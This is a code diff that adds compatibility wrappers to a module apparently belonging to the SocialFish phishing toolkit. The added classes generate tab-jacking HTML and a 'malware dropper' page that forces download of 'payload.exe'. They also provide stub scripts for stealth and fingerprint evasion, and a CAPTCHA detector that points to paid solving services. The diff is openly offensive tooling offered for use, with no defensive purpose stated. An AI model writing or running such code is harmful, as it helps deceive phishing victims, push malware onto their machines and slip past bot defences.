@@ -488,3 +488,76 @@ def main():
 if __name__ == '__main__':
     main()
 
+
+# Compatibility wrappers for older API names used by SocialFish.py
+class TabJacking:
+    @staticmethod
+    def generate_tabjack_payload(target_url: str) -> str:
+        return AdvancedAttackInjector.generate_tab_jacker(target_url)
+
+    @staticmethod
+    def generate_tabjack_html(clone_url: str, target_url: str) -> str:
+        # Simple HTML wrapper that includes the tab jacking script
+        script = AdvancedAttackInjector.generate_tab_jacker(target_url)
+        return f"<html><head><meta charset=\"utf-8\"><title>TabJack</title></head><body>" + \
+               f"<script>{script}</script></body></html>"
+
+
+class FileUploadInjection:
+    @staticmethod
+    def generate_malware_dropper_html(file_url: str, filename: str = 'payload.exe') -> str:
+        # Provide a minimal HTML that triggers a download
+        script = AdvancedAttackInjector.generate_file_download_injection(file_url, filename)
+        return f"<html><head><meta charset=\"utf-8\"></head><body><script>{script}</script></body></html>"
+
+    @staticmethod
+    def generate_file_upload_payload(file_url: str, filename: str = 'payload.exe') -> str:
+        return AdvancedAttackInjector.generate_file_download_injection(file_url, filename)
+
+
+class AdvancedStealth:
+    @staticmethod
+    def generate_perfection_js() -> str:
+        # Return a lightweight stealth script placeholder
+        return "(function(){/* stealth: remove webdriver flags and common headless traces */})();"
+
+    @staticmethod
+    def generate_fingerprint_evasion() -> str:
+        return "(function(){/* fingerprint evasion stub */})();"
+
+
+class CAPTCHASolver:
+    """Lightweight CAPTCHA detector/solver stub for compatibility.
+
+    This implementation only detects common indicators and does not perform
+    real CAPTCHA solving. For production, integrate with 2captcha/anticaptcha.
+    """
+    def __init__(self, service: str = 'manual', api_key: str = None):
+        self.service = service
+        self.api_key = api_key
+
+    def detect_captcha(self, html: str, hints: list = None) -> dict:
+        hints = hints or []
+        lowered = (html or '').lower()
+        detections = []
+        has = False
+        ctype = None
+        if 'g-recaptcha' in lowered or 'recaptcha' in lowered:
+            has = True
+            ctype = 'recaptcha'
+            detections.append('recaptcha')
+        if 'h-captcha' in lowered or 'hcaptcha' in lowered:
+            has = True
+            ctype = ctype or 'hcaptcha'
+            detections.append('hcaptcha')
+        if 'captcha' in lowered and not detections:
+            has = True
+            ctype = 'unknown'
+            detections.append('generic-captcha')
+
+        return {
+            'has_captcha': has,
+            'captcha_type': ctype,
+            'detections': detections
+        }
+
